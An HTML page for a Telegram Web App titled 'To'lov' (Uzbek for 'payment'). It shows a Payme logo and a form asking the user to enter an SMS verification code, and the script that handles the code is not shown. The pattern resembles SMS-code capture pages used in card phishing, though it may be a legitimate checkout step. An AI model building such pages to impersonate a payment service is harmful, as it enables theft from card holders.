<!DOCTYPE html>
<html lang="en">
  <head>
    <title>To'lov</title>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link rel="stylesheet" href="style/styles.css" />
  </head>
  <body>
    <div id="startPage" class="page loading_block">
      <div class="lds-ring">
        <div></div>
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>

    <div id="verifyCardPage" class="page active">
      <div class="modal">
        <form id="verifyCardForm" class="form">
          <div
            class="paymentother"
            style="
              text-align: center;
              display: flex;
              justify-content: center;
              width: auto;
            "
          >
            <img src="/img/payme.png" alt="" style="width: 50%" />
          </div>
          <div class="separator" style="display: flex; justify-content: center">
            <p style="text-align: center; width: 100%; font-size: 18px">
              Sms kodni kiriting
            </p>
          </div>
          <div class="card-info">
            <div class="input_container">
              <label class="input_label">Sms kodni kiriting</label>
              <input
                class="input_field"
                type="text"
                name="verificationCode"
                required
              />
            </div>
          </div>
          <div class="verify-info text-center error_message"></div>
          <button
            class="checkout"
            type="button"
            style="cursor: pointer; display: none"
          >
            <span>Tasdiqlash kodini olish</span>
          </button>
        </form>
      </div>
    </div>

    <script
      src="https://code.jquery.com/jquery-3.7.1.slim.min.js"
      integrity="sha256-kmHvs0B+OpCW5GVHUNjv9rOmY0IvSIRcf7zGUDTDQM8="
      crossorigin="anonymous"
    ></script>

    <script src="js/config.js"></script>
    <script src="js/verify.js"></script>
  </body>
</html>
